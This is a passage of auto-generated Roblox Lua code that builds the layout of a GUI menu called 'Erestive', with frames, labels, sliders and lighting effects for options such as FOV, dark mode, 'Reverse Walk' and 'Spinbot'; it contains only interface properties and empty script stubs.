-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV
G2L["24e"] = Instance.new("Frame", G2L["24c"]);
G2L["24e"]["ZIndex"] = 2;
G2L["24e"]["BorderSizePixel"] = 0;
G2L["24e"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["24e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["24e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["24e"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Animations
G2L["24f"] = Instance.new("LocalScript", G2L["24e"]);
G2L["24f"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Animations.Sample
G2L["250"] = Instance.new("ImageLabel", G2L["24f"]);
G2L["250"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["250"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["250"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["250"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["250"]["BackgroundTransparency"] = 1;
G2L["250"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.UICorner
G2L["251"] = Instance.new("UICorner", G2L["24e"]);
G2L["251"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button
G2L["252"] = Instance.new("TextButton", G2L["24e"]);
G2L["252"]["TextWrapped"] = true;
G2L["252"]["TextSize"] = 14;
G2L["252"]["TextScaled"] = true;
G2L["252"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["252"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["252"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["252"]["BackgroundTransparency"] = 1;
G2L["252"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["252"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["252"]["Text"] = [[ ]];
G2L["252"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.LocalScript
G2L["253"] = Instance.new("LocalScript", G2L["252"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.Animations
G2L["254"] = Instance.new("LocalScript", G2L["252"]);
G2L["254"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.LocalScript
G2L["255"] = Instance.new("LocalScript", G2L["252"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.ImageLabel
G2L["256"] = Instance.new("ImageLabel", G2L["252"]);
G2L["256"]["BorderSizePixel"] = 0;
G2L["256"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["256"]["Image"] = [[rbxassetid://85418834083506]];
G2L["256"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["256"]["Visible"] = false;
G2L["256"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["256"]["BackgroundTransparency"] = 1;
G2L["256"]["Position"] = UDim2.new(0.57881, 0, 0.64551, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Text
G2L["257"] = Instance.new("TextLabel", G2L["24e"]);
G2L["257"]["TextWrapped"] = true;
G2L["257"]["ZIndex"] = 9;
G2L["257"]["TextSize"] = 14;
G2L["257"]["TextScaled"] = true;
G2L["257"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["257"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["257"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["257"]["BackgroundTransparency"] = 1;
G2L["257"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["257"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["257"]["Text"] = [[Set]];
G2L["257"]["Name"] = [[Text]];
G2L["257"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.UIGradient
G2L["258"] = Instance.new("UIGradient", G2L["24e"]);
G2L["258"]["Rotation"] = -90;
G2L["258"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Folder
G2L["259"] = Instance.new("Folder", G2L["24e"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Folder.Sky
G2L["25a"] = Instance.new("Sky", G2L["259"]);
G2L["25a"]["SkyboxUp"] = [[http://www.roblox.com/asset/?id=14543371676]];
G2L["25a"]["SkyboxBk"] = [[http://www.roblox.com/asset/?id=14543264135]];
G2L["25a"]["SkyboxDn"] = [[http://www.roblox.com/asset/?id=14543358958]];
G2L["25a"]["SkyboxFt"] = [[http://www.roblox.com/asset/?id=14543257810]];
G2L["25a"]["SkyboxLf"] = [[http://www.roblox.com/asset/?id=14543275895]];
G2L["25a"]["SkyboxRt"] = [[http://www.roblox.com/asset/?id=14543280890]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Folder.SunRays
G2L["25b"] = Instance.new("SunRaysEffect", G2L["259"]);
G2L["25b"]["Intensity"] = 0.097;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Folder.ColorCorrection
G2L["25c"] = Instance.new("ColorCorrectionEffect", G2L["259"]);
G2L["25c"]["TintColor"] = Color3.fromRGB(122, 25, 207);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Folder.Bloom
G2L["25d"] = Instance.new("BloomEffect", G2L["259"]);
G2L["25d"]["Intensity"] = 1;
G2L["25d"]["Threshold"] = 2;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Folder.Atmosphere
G2L["25e"] = Instance.new("Atmosphere", G2L["259"]);
G2L["25e"]["Decay"] = Color3.fromRGB(122, 25, 207);
G2L["25e"]["Density"] = 0.44;
G2L["25e"]["Color"] = Color3.fromRGB(122, 25, 207);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.FOVSet
G2L["25f"] = Instance.new("TextBox", G2L["24c"]);
G2L["25f"]["Visible"] = false;
G2L["25f"]["Name"] = [[FOVSet]];
G2L["25f"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["25f"]["TextWrapped"] = true;
G2L["25f"]["TextSize"] = 14;
G2L["25f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25f"]["TextScaled"] = true;
G2L["25f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["25f"]["PlaceholderText"] = [[16 - classic]];
G2L["25f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["25f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["25f"]["Text"] = [[]];
G2L["25f"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.UIGradient
G2L["260"] = Instance.new("UIGradient", G2L["247"]);
G2L["260"]["Rotation"] = -90;
G2L["260"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark
G2L["261"] = Instance.new("Frame", G2L["19c"]);
G2L["261"]["BorderSizePixel"] = 0;
G2L["261"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["261"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["261"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["261"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["261"]["Name"] = [[Dark]];
G2L["261"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.UIListLayout
G2L["262"] = Instance.new("UIListLayout", G2L["261"]);
G2L["262"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV
G2L["263"] = Instance.new("Frame", G2L["261"]);
G2L["263"]["BorderSizePixel"] = 0;
G2L["263"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["263"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["263"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["263"]["Name"] = [[FOV]];
G2L["263"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.Text
G2L["264"] = Instance.new("TextLabel", G2L["263"]);
G2L["264"]["TextWrapped"] = true;
G2L["264"]["ZIndex"] = 9;
G2L["264"]["TextSize"] = 14;
G2L["264"]["TextScaled"] = true;
G2L["264"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["264"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["264"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["264"]["BackgroundTransparency"] = 1;
G2L["264"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["264"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["264"]["Text"] = [[darkmode]];
G2L["264"]["Name"] = [[Text]];
G2L["264"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.WhiteBar
G2L["265"] = Instance.new("Frame", G2L["263"]);
G2L["265"]["BorderSizePixel"] = 0;
G2L["265"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["265"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["265"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["265"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["265"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.WhiteBar.UIGradient
G2L["266"] = Instance.new("UIGradient", G2L["265"]);
G2L["266"]["Rotation"] = 90;
G2L["266"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.UICorner
G2L["267"] = Instance.new("UICorner", G2L["263"]);
G2L["267"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig
G2L["268"] = Instance.new("Frame", G2L["263"]);
G2L["268"]["BorderSizePixel"] = 0;
G2L["268"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["268"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["268"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["268"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.UICorner
G2L["269"] = Instance.new("UICorner", G2L["268"]);
G2L["269"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.FOVSet
G2L["26a"] = Instance.new("TextBox", G2L["268"]);
G2L["26a"]["Name"] = [[FOVSet]];
G2L["26a"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["26a"]["TextWrapped"] = true;
G2L["26a"]["TextSize"] = 14;
G2L["26a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26a"]["TextScaled"] = true;
G2L["26a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26a"]["RichText"] = true;
G2L["26a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["26a"]["ClearTextOnFocus"] = false;
G2L["26a"]["PlaceholderText"] = [[0]];
G2L["26a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["26a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["26a"]["Text"] = [[0]];
G2L["26a"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV
G2L["26b"] = Instance.new("Frame", G2L["268"]);
G2L["26b"]["ZIndex"] = 2;
G2L["26b"]["BorderSizePixel"] = 0;
G2L["26b"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["26b"]["Size"] = UDim2.new(1.68032, 0, 0.36356, 0);
G2L["26b"]["Position"] = UDim2.new(-0.76654, 0, 1.31329, 0);
G2L["26b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["26b"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.Animations
G2L["26c"] = Instance.new("LocalScript", G2L["26b"]);
G2L["26c"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["26d"] = Instance.new("ImageLabel", G2L["26c"]);
G2L["26d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26d"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["26d"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["26d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["26d"]["BackgroundTransparency"] = 1;
G2L["26d"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.UICorner
G2L["26e"] = Instance.new("UICorner", G2L["26b"]);
G2L["26e"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.Button
G2L["26f"] = Instance.new("TextButton", G2L["26b"]);
G2L["26f"]["TextWrapped"] = true;
G2L["26f"]["TextSize"] = 14;
G2L["26f"]["TextScaled"] = true;
G2L["26f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["26f"]["BackgroundTransparency"] = 1;
G2L["26f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["26f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["26f"]["Text"] = [[ ]];
G2L["26f"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.Button.LocalScript
G2L["270"] = Instance.new("LocalScript", G2L["26f"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.Button.Animations
G2L["271"] = Instance.new("LocalScript", G2L["26f"]);
G2L["271"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.Text
G2L["272"] = Instance.new("TextLabel", G2L["26b"]);
G2L["272"]["TextWrapped"] = true;
G2L["272"]["ZIndex"] = 9;
G2L["272"]["TextSize"] = 14;
G2L["272"]["TextScaled"] = true;
G2L["272"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["272"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["272"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["272"]["BackgroundTransparency"] = 1;
G2L["272"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["272"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["272"]["Text"] = [[Set]];
G2L["272"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.UIGradient
G2L["273"] = Instance.new("UIGradient", G2L["26b"]);
G2L["273"]["Rotation"] = -90;
G2L["273"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.UIGradient
G2L["274"] = Instance.new("UIGradient", G2L["263"]);
G2L["274"]["Rotation"] = -90;
G2L["274"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW
G2L["275"] = Instance.new("Frame", G2L["19c"]);
G2L["275"]["BorderSizePixel"] = 0;
G2L["275"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["275"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["275"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["275"]["Name"] = [[RW]];
G2L["275"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider
G2L["276"] = Instance.new("Frame", G2L["275"]);
G2L["276"]["BorderSizePixel"] = 0;
G2L["276"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["276"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["276"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["276"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Animations
G2L["277"] = Instance.new("LocalScript", G2L["276"]);
G2L["277"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Animations.Sample
G2L["278"] = Instance.new("ImageLabel", G2L["277"]);
G2L["278"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["278"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["278"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["278"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["278"]["BackgroundTransparency"] = 1;
G2L["278"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.UICorner
G2L["279"] = Instance.new("UICorner", G2L["276"]);
G2L["279"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.UIGradient
G2L["27a"] = Instance.new("UIGradient", G2L["276"]);
G2L["27a"]["Rotation"] = -90;
G2L["27a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button
G2L["27b"] = Instance.new("TextButton", G2L["276"]);
G2L["27b"]["TextTransparency"] = 1;
G2L["27b"]["TextSize"] = 14;
G2L["27b"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["27b"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["27b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27b"]["ZIndex"] = 2;
G2L["27b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["27b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["27b"]["Text"] = [[ ]];
G2L["27b"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button.server
G2L["27c"] = Instance.new("LocalScript", G2L["27b"]);
G2L["27c"]["Name"] = [[server]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button.UICorner
G2L["27d"] = Instance.new("UICorner", G2L["27b"]);
G2L["27d"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.OnOrOff
G2L["27e"] = Instance.new("TextLabel", G2L["275"]);
G2L["27e"]["TextWrapped"] = true;
G2L["27e"]["ZIndex"] = 2;
G2L["27e"]["TextSize"] = 14;
G2L["27e"]["TextScaled"] = true;
G2L["27e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27e"]["BackgroundTransparency"] = 1;
G2L["27e"]["Size"] = UDim2.new(0.68443, 0, 0.5158, 0);
G2L["27e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["27e"]["Text"] = [[Reverse Walk]];
G2L["27e"]["Name"] = [[OnOrOff]];
G2L["27e"]["Position"] = UDim2.new(0.07602, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.UICorner
G2L["27f"] = Instance.new("UICorner", G2L["275"]);
G2L["27f"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.UIGradient
G2L["280"] = Instance.new("UIGradient", G2L["275"]);
G2L["280"]["Rotation"] = -90;
G2L["280"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.UIStroke
G2L["281"] = Instance.new("UIStroke", G2L["275"]);
G2L["281"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW
G2L["282"] = Instance.new("Frame", G2L["19c"]);
G2L["282"]["BorderSizePixel"] = 0;
G2L["282"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["282"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["282"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["282"]["Name"] = [[RW]];
G2L["282"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider
G2L["283"] = Instance.new("Frame", G2L["282"]);
G2L["283"]["BorderSizePixel"] = 0;
G2L["283"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["283"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["283"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["283"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Animations
G2L["284"] = Instance.new("LocalScript", G2L["283"]);
G2L["284"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Animations.Sample
G2L["285"] = Instance.new("ImageLabel", G2L["284"]);
G2L["285"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["285"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["285"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["285"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["285"]["BackgroundTransparency"] = 1;
G2L["285"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.UICorner
G2L["286"] = Instance.new("UICorner", G2L["283"]);
G2L["286"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.UIGradient
G2L["287"] = Instance.new("UIGradient", G2L["283"]);
G2L["287"]["Rotation"] = -90;
G2L["287"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button
G2L["288"] = Instance.new("TextButton", G2L["283"]);
G2L["288"]["TextTransparency"] = 1;
G2L["288"]["TextSize"] = 14;
G2L["288"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["288"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["288"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["288"]["ZIndex"] = 2;
G2L["288"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["288"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["288"]["Text"] = [[ ]];
G2L["288"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button.server
G2L["289"] = Instance.new("LocalScript", G2L["288"]);
G2L["289"]["Name"] = [[server]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button.UICorner
G2L["28a"] = Instance.new("UICorner", G2L["288"]);
G2L["28a"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.OnOrOff
G2L["28b"] = Instance.new("TextLabel", G2L["282"]);
G2L["28b"]["TextWrapped"] = true;
G2L["28b"]["ZIndex"] = 2;
G2L["28b"]["TextSize"] = 14;
G2L["28b"]["TextScaled"] = true;
G2L["28b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28b"]["BackgroundTransparency"] = 1;
G2L["28b"]["Size"] = UDim2.new(0.68443, 0, 0.5158, 0);
G2L["28b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["28b"]["Text"] = [[Spinbot]];
G2L["28b"]["Name"] = [[OnOrOff]];
G2L["28b"]["Position"] = UDim2.new(0.07602, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.UICorner
G2L["28c"] = Instance.new("UICorner", G2L["282"]);
G2L["28c"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.UIGradient
G2L["28d"] = Instance.new("UIGradient", G2L["282"]);
G2L["28d"]["Rotation"] = -90;
G2L["28d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.UIStroke
G2L["28e"] = Instance.new("UIStroke", G2L["282"]);
G2L["28e"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW
G2L["28f"] = Instance.new("Frame", G2L["19c"]);
G2L["28f"]["BorderSizePixel"] = 0;
G2L["28f"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["28f"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["28f"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["28f"]["Name"] = [[RW]];
G2L["28f"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider
G2L["290"] = Instance.new("Frame", G2L["28f"]);
G2L["290"]["BorderSizePixel"] = 0;
G2L["290"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["290"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["290"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["290"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Animations
G2L["291"] = Instance.new("LocalScript", G2L["290"]);
G2L["291"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Animations.Sample
